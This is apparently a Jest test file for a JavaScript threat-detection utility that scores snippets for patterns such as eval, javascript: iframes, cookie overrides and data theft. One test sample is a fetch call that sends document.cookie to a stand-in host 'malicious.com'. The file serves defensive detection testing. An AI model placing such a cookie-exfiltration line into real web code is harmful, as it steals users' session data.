import { analyzeScript, ScriptAnalysis } from '../src/utils/script-analyzer';

describe('analyzeScript', () => {
  it('detects evasion patterns', () => {
    const script = `document.write('<iframe src="javascript:alert(1)"></iframe>');`;
    const result = analyzeScript(script);
    expect(result.threats).toContain('evasion');
    expect(result.score).toBeGreaterThanOrEqual(3);
  });

  it('detects covert execution patterns', () => {
    const script = `eval('alert(1)');`;
    const result = analyzeScript(script);
    expect(result.threats).toContain('covertExecution');
    expect(result.score).toBeGreaterThanOrEqual(3);
  });

  it('detects security bypass patterns', () => {
    const script = `Object.defineProperty(document, 'cookie', { value: 'test' });`;
    const result = analyzeScript(script);
    expect(result.threats).toContain('securityBypass');
    expect(result.score).toBeGreaterThanOrEqual(2);
  });

  it('detects malicious intent patterns', () => {
    const script = `fetch('https://malicious.com/steal?data=' + document.cookie);`;
    const result = analyzeScript(script);
    expect(result.threats).toContain('maliciousIntent');
    expect(result.score).toBeGreaterThanOrEqual(2);
  });

  it('detects suspicious string patterns', () => {
    const script = `bypass security`;
    const result = analyzeScript(script);
    expect(result.threats).toContain('suspicious-strings');
    expect(result.score).toBeGreaterThanOrEqual(1);
  });

  it('detects multiple threat categories and increases score', () => {
    const script = `document.write('<iframe src="javascript:alert(1)"></iframe>'); eval('alert(1)');`;
    const result = analyzeScript(script);
    expect(result.threats).toContain('evasion');
    expect(result.threats).toContain('covertExecution');
    expect(result.score).toBeGreaterThanOrEqual(5);
    expect(result.isMalicious).toBe(true);
  });

  it('returns safe for benign scripts', () => {
    const script = `console.log('hello world');`;
    const result = analyzeScript(script);
    expect(result.isMalicious).toBe(false);
    expect(result.threats.length).toBe(0);
    expect(result.score).toBe(0);
  });

  it('returns safe for empty scripts', () => {
    const script = '';
    const result = analyzeScript(script);
    expect(result.isMalicious).toBe(false);
    expect(result.threats.length).toBe(0);
    expect(result.score).toBe(0);
  });
}); 